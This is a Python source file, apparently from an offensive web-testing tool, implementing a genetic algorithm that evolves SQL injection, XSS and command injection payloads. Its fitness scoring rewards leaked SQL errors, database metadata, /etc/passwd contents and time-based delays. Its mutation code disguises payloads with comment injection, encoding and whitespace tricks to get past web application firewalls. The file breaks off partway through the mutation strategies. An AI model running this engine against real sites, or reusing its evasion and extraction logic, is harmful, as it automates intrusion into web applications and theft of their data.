"""
BypassEvo Genetic Algorithm Payload Evolution Engine

Implements a full GA pipeline:
  Population → Fitness Evaluation → Tournament Selection →
  Crossover → Adaptive Mutation → Elitist Replacement → Next Generation

Fitness is computed from:
  - Response time delta (time-based blind signals)
  - Content similarity shift (boolean-blind signals)
  - SQL error keyword hits
  - XSS reflection markers
  - HTTP status code anomalies
"""

import random
import math
import re
import hashlib
from dataclasses import dataclass, field
from difflib import SequenceMatcher
from typing import Optional
from tools.sql_error_kb import get_kb


def levenshtein_distance(s1: str, s2: str) -> int:
    """Compute Levenshtein edit distance between two strings."""
    if len(s1) < len(s2):
        return levenshtein_distance(s2, s1)
    if len(s2) == 0:
        return len(s1)
    prev_row = range(len(s2) + 1)
    for i, c1 in enumerate(s1):
        curr_row = [i + 1]
        for j, c2 in enumerate(s2):
            insertions = prev_row[j + 1] + 1
            deletions = curr_row[j] + 1
            substitutions = prev_row[j] + (c1 != c2)
            curr_row.append(min(insertions, deletions, substitutions))
        prev_row = curr_row
    return prev_row[-1]


def similarity_ratio(s1: str, s2: str) -> float:
    """Compute similarity ratio [0, 1] between two strings."""
    if not s1 and not s2:
        return 1.0
    max_len = max(len(s1), len(s2))
    if max_len == 0:
        return 1.0
    dist = levenshtein_distance(s1, s2)
    return 1.0 - (dist / max_len)


# ── Individual (chromosome) ────────────────────────────────────────────


@dataclass
class Individual:
    """A single payload in the population."""
    payload: str
    fitness: float = 0.0
    generation: int = 0
    parent_id: str = ""
    mutations_applied: list = field(default_factory=list)
    # Raw evaluation data
    response_time: float = 0.0
    response_code: int = 0
    response_snippet: str = ""
    indicators: list = field(default_factory=list)
    # Strategy family (for family-aware mutation)
    family: str = ""
    # Hypothesis linkage (for hypothesis-driven bypass)
    hypothesis_id: str = ""

    @property
    def id(self) -> str:
        return hashlib.md5(self.payload.encode()).hexdigest()[:8]


# ── Fitness Function ───────────────────────────────────────────────────


class FitnessEvaluator:
    """Computes fitness scores for individuals based on response analysis."""

    # Baseline response from a benign request (set before GA runs)
    baseline_time: float = 0.1
    baseline_content: str = ""
    baseline_code: int = 200

    # SQL error patterns (weighted by diagnostic value)
    SQL_ERROR_SIGNALS = {
        r"you have an error in your sql syntax": 1.0,
        r"warning.*mysql": 0.9,
        r"unclosed quotation mark": 0.95,
        r"supplied argument is not a valid": 0.85,
        r"microsoft ole db provider": 1.0,
        r"pg_query|pg_exec": 1.0,
        r"ora-\d{5}": 1.0,
        r"sqlite.*error": 0.9,
        r"syntax error": 0.8,
        r"mysql_fetch": 0.9,
        r"xpath.*error": 1.0,
        r"extractvalue": 1.0,
        r"updatexml": 1.0,
        r"division by zero": 0.85,
        r"invalid query": 0.8,
    }

    # UNION data extraction signals
    UNION_DATA_SIGNALS = {
        r"@@version": 0.95,
        r"@@datadir": 0.95,
        r"@@hostname": 0.90,
        r"database\(\)": 0.90,
        r"information_schema": 0.95,
        r"table_schema": 0.90,
        r"table_name": 0.85,
        r"column_name": 0.85,
        r"group_concat": 0.90,
        r"concat_ws": 0.85,
        r"string_agg": 0.90,
        r"mysql.*[0-9]+\.[0-9]+\.[0-9]+": 0.85,
        r"\d+\.\d+\.\d+[-+]\w+": 0.75,
        # NOTE: MD5/SHA1 hash patterns removed — too generic (match any hex in HTML/CSS)
        r"root:.*:0:0:": 0.95,
        r"uid=\d+\(": 0.95,
        r"~.*~": 0.70,
        r"xpath": 0.80,
    }

    # XSS reflection signals
    XSS_SIGNALS = {
        r"<script>alert": 1.0,
        r"onerror\s*=": 0.9,
        r"onload\s*=": 0.9,
        r"javascript:": 0.85,
        r"<img[^>]+onerror": 0.95,
        r"<svg[^>]+onload": 0.95,
    }

    # Command injection signals
    CMDI_SIGNALS = {
        r"root:.*:0:0:": 1.0,          # /etc/passwd
        r"uid=\d+\(.*?\)": 1.0,        # id output
        r"drwx|rwx": 0.7,              # ls output
        r"total \d+": 0.6,             # ls -l
    }

    def evaluate(self, individual: Individual, vuln_type: str = "sqli") -> float:
        """Compute fitness score [0, 1] for an individual."""
        score = 0.0
        weights = self._get_weights(vuln_type)

        # 1. Error signal detection (highest weight)
        error_score = self._score_errors(individual.response_snippet, vuln_type)
        score += error_score * weights["error"]

        # 2. UNION data extraction detection
        union_score = self._score_union_data(individual.response_snippet)
        score += union_score * weights.get("union", 0.0)

        # 3. Response time anomaly (time-based blind)
        time_score = self._score_time(individual.response_time)
        score += time_score * weights["time"]

        # 4. Content similarity shift (boolean-blind)
        content_score = self._score_content_shift(individual.response_snippet)
        score += content_score * weights["content"]

        # 5. HTTP status code anomaly
        code_score = self._score_status_code(individual.response_code)
        score += code_score * weights["status"]

        # 6. Indicator bonus (from scanner analysis)
        indicator_score = self._score_indicators(individual.indicators)
        score += indicator_score * weights["indicator"]

        # Normalize to [0, 1]
        individual.fitness = min(max(score, 0.0), 1.0)
        return individual.fitness

    def _score_errors(self, text: str, vuln_type: str) -> float:
        if not text:
            return 0.0
        text_lower = text.lower()

        # Use Knowledge Base for SQLi — covers XPATH, EXTRACTVALUE, UPDATEXML, etc.
        if vuln_type == "sqli":
            kb_score = get_kb().score(text)
            if kb_score > 0:
                return kb_score

        patterns = {
            "sqli": self.SQL_ERROR_SIGNALS,
            "xss": self.XSS_SIGNALS,
            "cmdi": self.CMDI_SIGNALS,
        }.get(vuln_type, self.SQL_ERROR_SIGNALS)

        max_score = 0.0
        for pattern, weight in patterns.items():
            if re.search(pattern, text_lower):
                max_score = max(max_score, weight)
        return max_score

    def _score_union_data(self, text: str) -> float:
        """Score based on UNION data extraction indicators in response."""
        if not text:
            return 0.0
        text_lower = text.lower()
        max_score = 0.0
        for pattern, weight in self.UNION_DATA_SIGNALS.items():
            if re.search(pattern, text_lower):
                max_score = max(max_score, weight)
        return max_score

    def _score_time(self, response_time: float) -> float:
        """Score based on time anomaly vs baseline.

        Uses both absolute thresholds and ratio-based detection.
        Absolute: response_time > 2.5s is strong signal regardless of baseline.
        Ratio-based: response_time / baseline_time for smaller delays.
        """
        # Absolute threshold (for SLEEP(3), BENCHMARK, etc.)
        if response_time > 3.0:
            return 1.0
        elif response_time > 2.5:
            return 0.9
        elif response_time > 2.0:
            return 0.7

        # Ratio-based (requires baseline)
        if self.baseline_time <= 0.05:
            return 0.0
        ratio = response_time / self.baseline_time
        if ratio > 5:
            return 1.0
        elif ratio > 3:
            return 0.7
        elif ratio > 1.5:
            return 0.3
        return 0.0

    def _score_content_shift(self, response_text: str) -> float:
        """Score based on how different the response is from baseline."""
        if not self.baseline_content or not response_text:
            return 0.0
        similarity = SequenceMatcher(
            None, self.baseline_content[:1000], response_text[:1000]
        ).ratio()
        # Lower similarity = higher score (more different = more interesting)
        shift = 1.0 - similarity
        return min(shift * 2, 1.0)  # Amplify small differences

    def _score_status_code(self, code: int) -> float:
        """Score based on status code anomaly."""
        if code == 500:
            return 0.9  # Internal server error = likely injectable
        elif code == 0:
            return 0.5  # Timeout
        elif code == 403:
            return 0.3  # Blocked but interesting
        elif code != self.baseline_code and code > 0:
            return 0.4
        return 0.0

    def _score_indicators(self, indicators: list) -> float:
        """Score based on scanner-detected indicators."""
        if not indicators:
            return 0.0
        score = 0.0
        for ind in indicators:
            if "sql_error" in ind:
                score = max(score, 0.95)
            elif "xss_reflection" in ind:
                score = max(score, 0.9)
            elif "payload_reflected" in ind:
                score = max(score, 0.5)
            elif "timeout" in ind:
                score = max(score, 0.6)
        return score

    def evaluate_blocked(self, individual: Individual, baseline_snippet: str = "", vuln_type: str = "sqli") -> float:
        """Differentiated fitness for blocked (403) responses.

        Not all 403s are equal — some payloads trigger different WAF rules,
        produce different response characteristics, or contain partial signals.
        This method extracts whatever signal exists from a blocked response.

        Returns fitness in [0.05, 0.35] range.
        """
        score = 0.05  # Minimum: at least we learned it was blocked

        snippet = individual.response_snippet or ""
        payload = individual.payload or ""

        # 1. Partial success: blocked by WAF but SQL error leaked in response
        #    (WAF blocked the pattern but backend still processed partial input)
        error_score = self._score_errors(snippet, vuln_type)
        if error_score > 0.3:
            score += 0.15  # Significant: WAF missed the semantic attack

        # 2. Response body length variation vs baseline
        #    Different WAF rules produce different block pages
        if baseline_snippet and snippet:
            len_diff = abs(len(snippet) - len(baseline_snippet))
            max_len = max(len(snippet), len(baseline_snippet), 1)
            len_ratio = len_diff / max_len
            if len_ratio > 0.5:
                score += 0.05  # Very different block page — different rule triggered

        # 3. Response time anomaly even when blocked
        #    Slow 403 might mean WAF did deep inspection or backend partially processed
        if individual.response_time > 2.0:
            score += 0.08
        elif individual.response_time > 1.0:
            score += 0.04

        # 4. Status code differentiation
        if individual.response_code == 406:
            score += 0.03  # 406 Not Acceptable — different from standard 403
        elif individual.response_code == 503:
            score += 0.03  # 503 — WAF rate limiting or overload

        # 5. Payload complexity bonus — more sophisticated payloads get higher base
        #    This creates fitness differentiation even when all responses are identical 403s
        if payload:
            complexity = 0.0
            # Bypass technique markers
            if "/**/" in payload or "/*!" in payload:
                complexity += 0.04  # Comment injection
            if "%27" in payload or "%25" in payload or "0x27" in payload:
                complexity += 0.04  # Encoding
            if "%09" in payload or "%0a" in payload or "%0d" in payload:
                complexity += 0.03  # Whitespace injection
            if payload != payload.lower() and payload != payload.upper():
                complexity += 0.03  # Case variation
            # Payload length diversity — longer payloads test more WAF rules
            if len(payload) > 30:
                complexity += 0.02
            score += min(complexity, 0.12)

        return min(score, 0.35)

    def _get_weights(self, vuln_type: str) -> dict:
        """Get scoring weights per vulnerability type.

        For SQLi, error and union signals are weighted heavily because they
        are the strongest indicators of successful exploitation.
        Weights sum > 1.0 intentionally — final score is capped at 1.0.
        """
        if vuln_type == "sqli":
            return {"error": 0.80, "union": 0.70, "time": 0.50, "content": 0.05, "status": 0.05, "indicator": 0.10}
        elif vuln_type == "xss":
            return {"error": 0.1, "union": 0.0, "time": 0.05, "content": 0.35, "status": 0.1, "indicator": 0.4}
        elif vuln_type == "cmdi":
            return {"error": 0.2, "union": 0.0, "time": 0.2, "content": 0.3, "status": 0.1, "indicator": 0.2}
        return {"error": 0.25, "union": 0.0, "time": 0.15, "content": 0.25, "status": 0.15, "indicator": 0.2}


# ── Genetic Algorithm Engine ───────────────────────────────────────────


class GeneticEngine:
    """Full genetic algorithm for payload evolution."""

    def __init__(
        self,
        population_size: int = 12,
        elite_count: int = 2,
        tournament_size: int = 3,
        crossover_rate: float = 0.7,
        base_mutation_rate: float = 0.15,
        vuln_type: str = "sqli",
    ):
        self.population_size = population_size
        self.elite_count = elite_count
        self.tournament_size = tournament_size
        self.crossover_rate = crossover_rate
        self.base_mutation_rate = base_mutation_rate
        self.vuln_type = vuln_type
        self.evaluator = FitnessEvaluator()
        self.generation = 0
        self.population: list[Individual] = []
        self.history: list[dict] = []  # Generation stats for visualization
        self.evolution_tree: dict[str, list[str]] = {}  # parent_id → [child_ids]
        # Island-model GA: per-hypothesis sub-populations
        self.sub_populations: dict[str, list[Individual]] = {}
        self.sub_stats: dict[str, list[dict]] = {}

    def initialize(self, seed_payloads: list) -> list[Individual]:
        """Create initial population from seed payloads.

        Accepts either strings or dicts with 'payload' and optional 'family' keys.
        """
        self.population = []
        for item in seed_payloads[:self.population_size]:
            if isinstance(item, dict):
                payload = item.get("payload", "")
                family = item.get("family", "")
            else:
                payload = str(item)
                family = ""
            ind = Individual(payload=payload, generation=0, family=family)
            self.population.append(ind)

        # Fill remaining slots with mutations of seeds
        while len(self.population) < self.population_size:
            parent = random.choice(seed_payloads)
            parent_str = parent.get("payload", "") if isinstance(parent, dict) else str(parent)
            parent_fam = parent.get("family", "") if isinstance(parent, dict) else ""
            mutated = self._mutate_for_family(parent_str, self.base_mutation_rate * 2, parent_fam)
            self.population.append(Individual(payload=mutated, generation=0, family=parent_fam))

        return self.population

    def evolve(self, evaluated_population: list[Individual]) -> list[Individual]:
        """Run one generation of the GA.

        Args:
            evaluated_population: current population WITH fitness scores set

        Returns:
            New generation of individuals (unevaluated)
        """
        self.generation += 1
        self.population = evaluated_population

        # Sort by fitness
        self.population.sort(key=lambda x: x.fitness, reverse=True)

        # Record generation stats
        fitnesses = [ind.fitness for ind in self.population]
        self.history.append({
            "generation": self.generation,
            "best_fitness": fitnesses[0] if fitnesses else 0,
            "avg_fitness": sum(fitnesses) / max(len(fitnesses), 1),
            "worst_fitness": fitnesses[-1] if fitnesses else 0,
            "best_payload": self.population[0].payload if self.population else "",
            "population_size": len(self.population),
        })

        # Adaptive mutation rate: increase if stuck
        mutation_rate = self._adaptive_mutation_rate()

        # Elitism: preserve top-K
        new_population = []
        seen_payloads = set()
        for i in range(min(self.elite_count, len(self.population))):
            elite = Individual(
                payload=self.population[i].payload,
                generation=self.generation,
                mutations_applied=["elite"],
                family=self.population[i].family,
            )
            new_population.append(elite)
            seen_payloads.add(self.population[i].payload)

        # Collect all historical payloads for dedup
        all_history_payloads = set()
        for gen in self.history:
            if gen.get("best_payload"):
                all_history_payloads.add(gen["best_payload"])
        for ind in self.population:
            all_history_payloads.add(ind.payload)

        # Fill rest with selection + crossover + mutation
        max_attempts = self.population_size * 10  # Prevent infinite loop
        attempts = 0
        while len(new_population) < self.population_size and attempts < max_attempts:
            attempts += 1
            parent_a = self._tournament_select()
            parent_b = self._tournament_select()

            # Crossover
            if random.random() < self.crossover_rate and parent_a.payload != parent_b.payload:
                child_payload = self._crossover(parent_a.payload, parent_b.payload)
                method = "crossover"
            else:
                child_payload = parent_a.payload
                method = "clone"

            # Mutation — use family-aware mutation when parent has family info
            if random.random() < mutation_rate:
                parent_family = parent_a.family or ""
                child_payload = self._mutate_for_family(child_payload, mutation_rate, parent_family)
                method += f"+mutate({parent_family or 'generic'})"

            # Dedup check: skip if too similar to existing payloads
            if self._is_duplicate(child_payload, seen_payloads):
                # Force extra mutation to increase diversity
                child_payload = self._mutate(child_payload, min(mutation_rate * 2, 0.8))
                method += "+dedup_mutate"
                if self._is_duplicate(child_payload, seen_payloads):
                    continue  # Still duplicate, skip

            # Anti-convergence: reject stale strategies (e.g., repeated BENCHMARK)
            recent = [ind.payload for ind in self.population[-6:]]
            if self._is_stale_strategy(child_payload, recent):
                child_payload = self._mutate(child_payload, min(mutation_rate * 3, 0.9))
                method += "+anti_stale"
                if self._is_stale_strategy(child_payload, recent):
                    continue  # Still stale, skip

            child = Individual(
                payload=child_payload,
                generation=self.generation,
                parent_id=parent_a.id,
                mutations_applied=[method],
                family=parent_a.family,
            )
            new_population.append(child)
            seen_payloads.add(child_payload)

            # Track evolution tree
            self.evolution_tree.setdefault(parent_a.id, []).append(child.id)

        # Diversity enforcement: if fewer than 2 strategy families represented,
        # force-mutate some individuals to try different families
        families = self._count_strategy_families(new_population)
        active_families = sum(1 for v in families.values() if v > 0)
        if active_families < 2 and len(new_population) >= 4:
            # Pick individuals from the dominant family and force-mutate them
            dominant = max(families, key=families.get)
            force_mutated = 0
            for i, ind in enumerate(new_population):
                if force_mutated >= 2:
                    break
                pl = ind.payload.lower()
                family_markers = {
                    "time": ["benchmark", "sleep", "pg_sleep", "waitfor"],
                    "error_xp": ["updatexml", "extractvalue"],
                    "error_exp": ["exp(~"],
                    "error_floor": ["floor(rand"],
                    "union": ["union select"],
                    "boolean": ["substring("],
                }
                markers = family_markers.get(dominant, [])
                if any(m in pl for m in markers):
                    new_payload = self._mutate(ind.payload, min(mutation_rate * 3, 0.9))
                    if new_payload != ind.payload:
                        new_population[i] = Individual(
                            payload=new_payload,
                            generation=self.generation,
                            parent_id=ind.id,
                            mutations_applied=["diversity_force"],
                            family=ind.family,
                        )
                        force_mutated += 1

        self.population = new_population
        return new_population

    # ── Island-Model GA ────────────────────────────────────────────────

    def _partition_population(
        self, population: list[Individual], hypotheses: list[dict]
    ) -> dict[str, list[Individual]]:
        """Group individuals by hypothesis_id. Untagged go to '_untagged' key."""
        active_ids = {h.get("mechanism", "") for h in hypotheses if h.get("mechanism")}
        partitions: dict[str, list[Individual]] = {hid: [] for hid in active_ids}
        partitions["_untagged"] = []

        for ind in population:
            if ind.hypothesis_id and ind.hypothesis_id in active_ids:
                partitions[ind.hypothesis_id].append(ind)
            else:
                partitions["_untagged"].append(ind)

        return partitions

    def evolve_islands(
        self,
        evaluated_population: list[Individual],
        hypotheses: list[dict],
        migration_threshold: float = 0.7,
        min_island_size: int = 4,
    ) -> list[Individual]:
        """Evolve per-hypothesis sub-populations independently.

        1. Partition evaluated_population by hypothesis_id
        2. Evolve each sub-population using hypothesis-specific mutation_strategy
        3. Migrate top individual when best_fitness > migration_threshold
        4. Maintain minimum sub-population size (pad with mutations if needed)
        5. Record per-island stats in sub_stats
        6. Merge all sub-populations back into flat list
        """
        self.generation += 1

        # 1. Partition population by hypothesis_id
        partitions = self._partition_population(evaluated_population, hypotheses)
        self.sub_populations = partitions

        # Build hypothesis lookup: mechanism → hypothesis dict
        hyp_lookup = {h.get("mechanism", ""): h for h in hypotheses if h.get("mechanism")}

        # 2. Evolve each sub-population independently
        evolved_partitions: dict[str, list[Individual]] = {}
        for hid, sub_pop in partitions.items():
            if not sub_pop:
                evolved_partitions[hid] = []
                continue

            # Determine mutation strategy from hypothesis
            hyp = hyp_lookup.get(hid)
            mutation_strategy = hyp.get("mutation_strategy", "") if hyp else ""

            # Evolve this sub-population
            evolved = self._evolve_sub_population(sub_pop, mutation_strategy, hid)
            evolved_partitions[hid] = evolved

        # 4. Ensure minimum island size (pad with mutations if needed)
        for hid, sub_pop in evolved_partitions.items():
            if hid == "_untagged":
                continue  # No minimum for untagged pool
            while len(sub_pop) < min_island_size:
                if sub_pop:
                    # Mutate the best individual to pad
                    best = max(sub_pop, key=lambda x: x.fitness)
                    hyp = hyp_lookup.get(hid)
                    strategy = hyp.get("mutation_strategy", "") if hyp else ""
                    mutated_payload = self._mutate_for_family(
                        best.payload, self.base_mutation_rate * 2, strategy
                    )
                    padded = Individual(
                        payload=mutated_payload,
                        generation=self.generation,
                        parent_id=best.id,
                        mutations_applied=["island_pad"],
                        family=best.family,
                        hypothesis_id=hid,
                    )
                    sub_pop.append(padded)
                else:
                    # No individuals at all — create from hypothesis seed_payloads
                    hyp = hyp_lookup.get(hid)
                    seeds = hyp.get("seed_payloads", []) if hyp else []
                    if seeds:
                        seed = random.choice(seeds)
                        strategy = hyp.get("mutation_strategy", "") if hyp else ""
                        mutated_payload = self._mutate_for_family(
                            seed, self.base_mutation_rate * 2, strategy
                        )
                        padded = Individual(
                            payload=mutated_payload,
                            generation=self.generation,
                            mutations_applied=["island_seed_pad"],
                            family=strategy,
                            hypothesis_id=hid,
                        )
                        sub_pop.append(padded)
                    else:
                        # No seeds available — generate a basic payload from hypothesis description
                        hyp_desc = hyp.get("mechanism", "unknown") if hyp else "unknown"
                        # Use untagged population as donor if available
                        untagged = evolved_partitions.get("_untagged", [])
                        if untagged:
                            donor = random.choice(untagged)
                            strategy = hyp.get("mutation_strategy", "") if hyp else ""
                            mutated_payload = self._mutate_for_family(
                                donor.payload, self.base_mutation_rate * 3, strategy
                            )
                            padded = Individual(
                                payload=mutated_payload,
                                generation=self.generation,
                                mutations_applied=["island_donor_pad"],
                                family=strategy,
                                hypothesis_id=hid,
                            )
                            sub_pop.append(padded)
                        else:
                            break  # No seeds and no donors, can't pad

        # 3. Migration: copy top individual to other islands when best_fitness > threshold
        active_ids = [hid for hid in evolved_partitions if hid != "_untagged" and evolved_partitions[hid]]
        for hid in active_ids:
            sub_pop = evolved_partitions[hid]
            if not sub_pop:
                continue
            best = max(sub_pop, key=lambda x: x.fitness)
            if best.fitness > migration_threshold:
                target_ids = [tid for tid in active_ids if tid != hid]
                self._migrate_to(best, hid, target_ids, evolved_partitions)

        # 5. Record per-island stats
        for hid, sub_pop in evolved_partitions.items():
            if not sub_pop:
                continue
            fitnesses = [ind.fitness for ind in sub_pop]
            stats_entry = {
                "generation": self.generation,
                "best_fitness": max(fitnesses),
                "avg_fitness": sum(fitnesses) / len(fitnesses),
                "population_size": len(sub_pop),
                "best_payload": max(sub_pop, key=lambda x: x.fitness).payload,
            }
            if hid not in self.sub_stats:
                self.sub_stats[hid] = []
            self.sub_stats[hid].append(stats_entry)

        # Update sub_populations with evolved state
        self.sub_populations = evolved_partitions

        # 6. Merge all sub-populations back into flat list
        merged: list[Individual] = []
        for sub_pop in evolved_partitions.values():
            merged.extend(sub_pop)

        self.population = merged
        return merged

    def _evolve_sub_population(
        self, sub_pop: list[Individual], mutation_strategy: str, hypothesis_id: str
    ) -> list[Individual]:
        """Evolve a single sub-population using hypothesis-specific mutation strategy.

        Reuses the core GA logic (tournament selection, crossover, elitism) but
        applies family-specific mutation based on the hypothesis's mutation_strategy.
        """
        if not sub_pop:
            return []

        # Sort by fitness
        sub_pop.sort(key=lambda x: x.fitness, reverse=True)

        # Adaptive mutation rate
        mutation_rate = self._adaptive_mutation_rate()

        # Elitism: preserve top individual(s)
        elite_count = max(1, min(self.elite_count, len(sub_pop)))
        new_pop: list[Individual] = []
        seen_payloads: set[str] = set()

        for i in range(elite_count):
            elite = Individual(
                payload=sub_pop[i].payload,
                generation=self.generation,
                mutations_applied=["elite"],
                family=sub_pop[i].family,
                hypothesis_id=hypothesis_id,
                fitness=sub_pop[i].fitness,
            )
            new_pop.append(elite)
            seen_payloads.add(sub_pop[i].payload)

        # Fill rest with selection + crossover + mutation
        target_size = len(sub_pop)
        max_attempts = target_size * 10
        attempts = 0

        while len(new_pop) < target_size and attempts < max_attempts:
            attempts += 1

            # Tournament selection within this sub-population
            k = min(self.tournament_size, len(sub_pop))
            parent_a = max(random.sample(sub_pop, k), key=lambda x: x.fitness)
            parent_b = max(random.sample(sub_pop, k), key=lambda x: x.fitness)

            # Crossover
            if random.random() < self.crossover_rate and parent_a.payload != parent_b.payload:
                child_payload = self._crossover(parent_a.payload, parent_b.payload)
                method = "crossover"
            else:
                child_payload = parent_a.payload
                method = "clone"

            # Mutation — use hypothesis-specific mutation_strategy
            if random.random() < mutation_rate:
                child_payload = self._mutate_for_family(child_payload, mutation_rate, mutation_strategy)
                method += f"+mutate({mutation_strategy or 'generic'})"

            # Dedup
            if child_payload in seen_payloads:
                child_payload = self._mutate_for_family(child_payload, mutation_rate * 2, mutation_strategy)
                method += "+dedup"
                if child_payload in seen_payloads:
                    continue

            child = Individual(
                payload=child_payload,
                generation=self.generation,
                parent_id=parent_a.id,
                mutations_applied=[method],
                family=parent_a.family,
                hypothesis_id=hypothesis_id,
            )
            new_pop.append(child)
            seen_payloads.add(child_payload)

        return new_pop

    def _migrate_to(
        self,
        individual: Individual,
        source_id: str,
        target_ids: list[str],
        partitions: dict[str, list[Individual]],
    ):
        """Copy top individual from source island to target islands."""
        for tid in target_ids:
            if tid not in partitions:
                continue
            migrant = Individual(
                payload=individual.payload,
                generation=self.generation,
                parent_id=individual.id,
                mutations_applied=["migrated"],
                family=individual.family,
                hypothesis_id=tid,  # Re-tag to target hypothesis
                fitness=individual.fitness,
            )
            partitions[tid].append(migrant)

    def _migrate(self, source_id: str, target_ids: list[str]):
        """Copy top individual from source island to target islands.

        Operates on self.sub_populations directly.
        """
        if source_id not in self.sub_populations or not self.sub_populations[source_id]:
            return
        source_pop = self.sub_populations[source_id]
        best = max(source_pop, key=lambda x: x.fitness)
        self._migrate_to(best, source_id, target_ids, self.sub_populations)

    def redistribute_discarded(self, discarded_id: str, active_ids: list[str]):
        """Move individuals from discarded hypothesis to active ones by fitness rank.

        Distributes individuals in descending fitness order across active hypotheses
        in round-robin fashion.
        """
        if discarded_id not in self.sub_populations:
            return
        if not active_ids:
            return

        discarded_pop = self.sub_populations.pop(discarded_id, [])
        if not discarded_pop:
            return

        # Sort by fitness descending (highest first)
        discarded_pop.sort(key=lambda x: x.fitness, reverse=True)

        # Distribute round-robin to active hypotheses
        for i, ind in enumerate(discarded_pop):
            target_id = active_ids[i % len(active_ids)]
            # Re-tag individual to new hypothesis
            ind.hypothesis_id = target_id
            ind.mutations_applied = ind.mutations_applied + ["redistributed"]
            if target_id in self.sub_populations:
                self.sub_populations[target_id].append(ind)

    def _is_duplicate(self, payload: str, seen: set, threshold: float = 0.65) -> bool:
        """Check if payload is too similar to any seen payload.

        Uses threshold 0.65 to enforce strong diversity and prevent
        convergence on a single strategy family. Lowered from 0.75 to
        catch more near-duplicates that would waste iterations.
        """
        if payload in seen:
            return True
        for existing in seen:
            if similarity_ratio(payload, existing) >= threshold:
                return True
        return False

    def _count_strategy_families(self, population: list) -> dict:
        """Count how many individuals use each strategy family."""
        families = {
            "time": 0, "error_xp": 0, "error_exp": 0, "error_floor": 0,
            "union": 0, "boolean": 0, "comment_bypass": 0, "hex_encode": 0,
            "other": 0,
        }
        family_markers = {
            "time": ["benchmark", "sleep", "pg_sleep", "waitfor"],
            "error_xp": ["updatexml", "extractvalue"],
            "error_exp": ["exp(~", "exp("],
            "error_floor": ["floor(rand", "floor("],
            "union": ["union select"],
            "boolean": ["substring(", "substr(", "ascii("],
            "comment_bypass": ["/**/", "/*!"],
            "hex_encode": ["0x27", "0x7e", "unhex("],
        }
        for ind in population:
            pl = ind.payload.lower()
            matched = False
            for fname, markers in family_markers.items():
                if any(m in pl for m in markers):
                    families[fname] += 1
                    matched = True
                    break
            if not matched:
                families["other"] += 1
        return families

    def _is_stale_strategy(self, payload: str, recent_payloads: list[str]) -> bool:
        """Check if payload uses the same dominant strategy as recent payloads.

        Prevents convergence on any single strategy family by detecting when
        >30% of recent payloads share the same dominant keyword class.
        More aggressive than before to prevent BENCHMARK/SLEEP local optima.
        Covers: time-based, error-based, UNION, boolean-blind, encoding.
        """
        if len(recent_payloads) < 2:
            return False
        pl = payload.lower()

        # Strategy families — each row is a family of related markers
        strategy_families = {
            "time": ["benchmark", "sleep", "pg_sleep", "waitfor", "dbms_pipe"],
            "error_xp": ["updatexml", "extractvalue"],
            "error_exp": ["exp(~", "exp("],
            "error_floor": ["floor(rand", "floor("],
            "union": ["union select", "union all select"],
            "boolean": ["substring(", "substr(", "ascii(", "char("],
            "comment_bypass": ["/**/", "/*!"],
            "hex_encode": ["0x27", "0x7e", "unhex(", "hex("],
            "double_encode": ["%2527", "%2520"],
        }

        for family_name, markers in strategy_families.items():
            # Check if this payload uses this family
            payload_uses = any(m in pl for m in markers)
            if not payload_uses:
                continue
            # Count how many recent payloads use the same family
            count = sum(
                1 for rp in recent_payloads
                if any(m in rp.lower() for m in markers)
            )
            # Lowered from 40% to 30% — more aggressive diversity enforcement
            if count >= len(recent_payloads) * 0.3:
                return True

        return False

    def set_baseline(self, response_time: float, response_content: str, status_code: int):
        """Set baseline response metrics for fitness evaluation."""
        self.evaluator.baseline_time = response_time
        self.evaluator.baseline_content = response_content
        self.evaluator.baseline_code = status_code

    def get_stats(self) -> dict:
        """Get current GA statistics."""
        if not self.history:
            return {"generation": 0, "best_fitness": 0, "avg_fitness": 0}
        latest = self.history[-1]
        return {
            "generation": self.generation,
            "best_fitness": latest["best_fitness"],
            "avg_fitness": latest["avg_fitness"],
            "worst_fitness": latest["worst_fitness"],
            "best_payload": latest["best_payload"],
            "mutation_rate": self._adaptive_mutation_rate(),
            "population_size": len(self.population),
            "history": self.history,
        }

    # ── Selection ──────────────────────────────────────────────────────

    def _tournament_select(self) -> Individual:
        """Tournament selection: pick best from random subset."""
        k = min(self.tournament_size, len(self.population))
        tournament = random.sample(self.population, k)
        return max(tournament, key=lambda x: x.fitness)

    # ── Crossover ──────────────────────────────────────────────────────

    def _crossover(self, a: str, b: str) -> str:
        """Single-point or two-point crossover."""
        if len(a) < 3 or len(b) < 3:
            return a

        if random.random() < 0.5:
            return self._single_point_crossover(a, b)
        return self._two_point_crossover(a, b)

    def _single_point_crossover(self, a: str, b: str) -> str:
        cut = random.randint(1, min(len(a), len(b)) - 1)
        return a[:cut] + b[cut:]

    def _two_point_crossover(self, a: str, b: str) -> str:
        min_len = min(len(a), len(b))
        if min_len < 3:
            return a
        p1 = random.randint(1, min_len - 2)
        p2 = random.randint(p1 + 1, min_len - 1)
        return a[:p1] + b[p1:p2] + a[p2:]

    # ── Mutation ───────────────────────────────────────────────────────

    def _adaptive_mutation_rate(self) -> float:
        """Increase mutation rate when fitness stagnates."""
        if len(self.history) < 3:
            return self.base_mutation_rate
        recent = self.history[-3:]
        improvement = recent[-1]["best_fitness"] - recent[0]["best_fitness"]
        if improvement < 0.01:
            # Stagnated: boost mutation
            return min(self.base_mutation_rate * 2.0, 0.6)
        elif improvement < 0.05:
            return min(self.base_mutation_rate * 1.5, 0.4)
        return self.base_mutation_rate

    def _mutate(self, payload: str, rate: float) -> str:
        """Apply type-aware mutation."""
        if self.vuln_type == "sqli":
            return self._mutate_sqli(payload, rate)
        elif self.vuln_type == "xss":
            return self._mutate_xss(payload, rate)
        elif self.vuln_type == "cmdi":
            return self._mutate_cmdi(payload, rate)
        return self._random_mutate(payload, rate)

    def _mutate_for_family(self, payload: str, rate: float, family: str) -> str:
        """Family-aware mutation: use strategies specific to the bypass family.

        When we know which bypass family a payload belongs to, we mutate within
        that family's strategy space instead of randomly across all strategies.
        This makes the GA's search more focused and productive.
        """
        if not family:
            # Infer family from payload content
            family = self._infer_family_from_payload(payload)
            if not family:
                return self._mutate(payload, rate)

        fam = family.lower()
        strategies = []

        # Comment injection family: vary comment syntax, position, nesting
        if "comment" in fam or "/**/" in payload or "/*!" in payload:
            strategies = [
                lambda p: p.replace("/**/", "/**/"),  # identity (already comment-based)
                lambda p: p.replace("/**/", "/*!*/"),
                lambda p: p.replace("/**/", f"/*!{random.randint(1000,9999)}*/"),
                lambda p: p.replace(" ", "/**/"),
                lambda p: p.replace(" ", f"/*!{random.randint(1,9)}*/"),
                lambda p: p + f"/*!{random.randint(1000,9999)}*/",
                lambda p: p.replace("UNION", "/*!50000UNION*/"),
                lambda p: p.replace("SELECT", "/*!50000SELECT*/"),
